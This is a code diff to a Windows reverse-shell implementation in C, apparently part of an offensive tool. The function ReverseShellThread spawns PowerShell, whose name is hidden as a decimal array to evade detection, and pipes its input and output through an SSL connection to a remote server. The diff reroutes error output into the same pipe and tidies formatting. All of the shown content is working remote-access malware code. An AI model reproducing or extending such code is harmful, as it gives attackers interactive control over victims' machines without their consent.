@@ -149,9 +149,6 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
     //STARTF_USESTDHANDLES - Used for Standard Input, Output and Error
     sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
     
-    //Pipe Error to Socket (No Need)
-    sinfo.hStdError = (HANDLE) shell;
-
     //Initialize Security Attributes
     SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
     
@@ -167,6 +164,7 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
 
     sinfo.hStdInput = hStdinRead;
     sinfo.hStdOutput = hStdoutWrite;
+    sinfo.hStdError = hStdoutWrite;
 
     //powershell in dec
     int decimal_array[] = {112, 111, 119, 101, 114, 115, 104, 101, 108, 108};
@@ -191,9 +189,9 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
         DWORD bytesReadOutput;
         //Read Output
         ReadFile(hStdoutRead, buffer, sizeof(buffer) - 1, &bytesReadOutput, NULL);
-            //Send to Server
-            SSL_write(ssl, buffer, bytesReadOutput);
-            memset(buffer, 0, sizeof(buffer));
+        //Send to Server
+        SSL_write(ssl, buffer, bytesReadOutput);
+        memset(buffer, 0, sizeof(buffer));
     }
 
     //Close Handle
